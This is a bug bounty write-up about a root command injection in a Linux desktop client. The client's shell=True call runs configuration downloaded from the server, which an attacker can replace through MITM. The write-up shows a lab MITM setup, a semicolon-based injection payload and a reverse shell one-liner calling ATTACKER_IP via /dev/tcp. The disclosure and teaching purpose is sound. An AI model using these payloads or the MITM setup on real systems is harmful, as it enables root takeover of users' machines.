---
title:       "Root command injection over MITM: the server writes your command line"
summary:     "A console tool running under sudo downloaded its configuration from the server and pasted it, verbatim, into a shell call. One semicolon in the right place and the attacker is root. Report accepted and rewarded."
date:        2026-10-29 21:10:00 +0100
lang:        en
ref:         rce-cli-shell-true
image:       /assets/img/og/rce-cli-shell-true-en.png
permalink:   /en/writeups/server-controlled-config-shell-rce/

severity:    high
cvss:        "8.0"
cvss_vector: "CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
cwe:         "CWE-78 · CWE-88"
vuln_class:  "Injection"
target_type: "Desktop client (Linux)"
platform:    "YesWeHack"
status:      "Fixed"
reward:      "Rewarded"
tags:        [rce, linux, shell, mitm, root, command-injection, python]

takeaways:
  - "`shell=True` turns a string into a program. If part of that string comes from the network, the server writes your command line."
  - "\"But the attacker needs a MITM\" is not an excuse: if the program's scope contemplates it, it is a precondition, not a barrier."
  - "When a client accepts **options** from a server, you need an allowlist. Filtering odd characters always falls short."
  - "The program's own error message showed me the command it had built. Reading errors slowly is worth more than many payloads."
---

A Linux command-line tool, part of a desktop application, that runs under `sudo` because it
has to touch the system's network configuration. When you ask it to connect it asks the
vendor's server for the parameters, builds a command out of them, and runs it. The whole bug
lives in that jump.

## The line

```python
# libs/helpers.py
def execute_command(cmd):
    process = subprocess.Popen(cmd, shell=True)
```

`shell=True` changes the meaning of everything. Without a shell you pass a list and the
semicolon is just another character in the argument. With a shell you pass a sentence for
`/bin/sh` to interpret, and there a semicolon means "one command ends here and another
begins".

```python
target = "8.8.8.8; touch /tmp/gotcha"

subprocess.run(["ping", "-c1", target])            # ping fails, nothing is created
subprocess.run(f"ping -c1 {target}", shell=True)   # the file appears
```

<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/04-shell-true-en.svg' | relative_url }}"
       alt="Diagram: on the left an argument list, where the semicolon is just a character; on the right a string with shell=True, where the shell reads it as a command separator">
  <figcaption>The same order down both paths. On the left data stays data; on the right it has become code.</figcaption>
</figure>

## What went into that string

```python
response = requests.get(f"https://api.example.tld/v2/my/servers/{server_id}/configs")
block    = response.json()["clientdata"]

params = parse_config(block)        # split by lines and spaces, nothing filtered

cmd = "sudo {} {} {}".format(binary, " ".join(params), filters)
execute_command(cmd)                # <- shell=True
```

It does not check which options are valid, nor whether the values carry dangerous
characters. The server has write access to your command line.

## "But you have to be the server for that"

You have to sit in the middle of that HTTPS connection, yes. And that happens more often
than it sounds: public wifi with a preinstalled root certificate, corporate laptops with an
inspection certificate, a compromised intermediate CA, an insider at the network provider.

And the decisive part: the bug bounty program itself listed it in scope, under *"arbitrary
code execution via MITM attacks"*. If the program contemplates it, it is not an excuse not
to report: it is a declared precondition.

<div class="note" markdown="1">
Before dropping a bug because "it needs an unusual condition", read the scope. Plenty of
programs list explicitly which preconditions they accept.
</div>

What makes it the product's bug: the client did not check which certificate it was accepting
beyond the system's normal validation. Another part of the same product did — it pinned the
expected certificate — but this one did not. That inconsistency was half the report.

## The lab

A disposable virtual machine playing both parts.

```bash
# 1 · my own CA, trusted by the system
openssl req -x509 -newkey rsa:4096 -nodes -days 1 \
        -keyout ca.key -out ca.crt -subj "/CN=LAB-CA"
sudo cp ca.crt /usr/local/share/ca-certificates/lab.crt && sudo update-ca-certificates

# 2 · a certificate for the vendor's domain, signed by it
# 3 · the domain pointing at my machine
echo "127.0.0.1  api.example.tld" | sudo tee -a /etc/hosts

# 4 · a proxy forwarding everything to the real server except the config request
```

Login works, the server list works, everything normal. I only intercept the request that
carries the configuration.

<figure>
  <img src="{{ '/assets/img/writeups/rce-cli-shell-true/05-mitm-en.svg' | relative_url }}"
       alt="Diagram of the setup: the victim's client talks to the attacker's proxy, which forwards every request to the real server except the configuration one, whose response it replaces">
  <figcaption>Three of the four requests pass untouched. Only the response that matters is replaced.</figcaption>
</figure>

## The payload

```
cipher aes-256-gcm; id > /tmp/pwn; touch /tmp/marker; #
```

| Piece | What it does |
|---|---|
| `cipher aes-256-gcm` | Looks like a legitimate option; a glance sees nothing odd |
| `; id > /tmp/pwn; touch /tmp/marker` | The semicolons close the previous command and open mine |
| `#` | Comments out whatever the program appends afterwards |

It is the same as a SQL injection, except the database is your operating system.

## Firing it

The victim types the product's documented command. And something happened that improved the
report: the binary died because the hash left its order half-written, and on dying **the
program printed the full sentence it had tried to run, with my payload inside it**. The
program's failure is the proof of the program's failure.

The commands had already run by then: the shell works left to right. The file was created by
`uid=0`. And since no connection came up, the user just saw an error and tried again, firing
the payload a second time.

## From "I run commands" to "I am in"

A marker in `/tmp` proves the mechanism but not how much it hurts. I swapped the payload for
a reverse shell:

```
cipher aes-256-gcm; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' & id > /tmp/pwn; #
```

From there I type in my terminal and the commands run on their machine, as root. That jump
is what turns a *Medium* into a *High*.

## Impact

<div class="impact" markdown="1">
**Impact.** Command execution as **root** on any Linux machine with the client installed,
with the victim performing exactly one action: the command the product itself documents.
The attacker's code runs **before** the connection is established, so it can install
persistence (`authorized_keys`, a scheduled task, a system service) in milliseconds.
Changing the account password achieves nothing: the attacker is no longer in the account,
they are on the machine. The only reliable cleanup is reinstalling the operating system,
and the victim has no reason to suspect it.
</div>
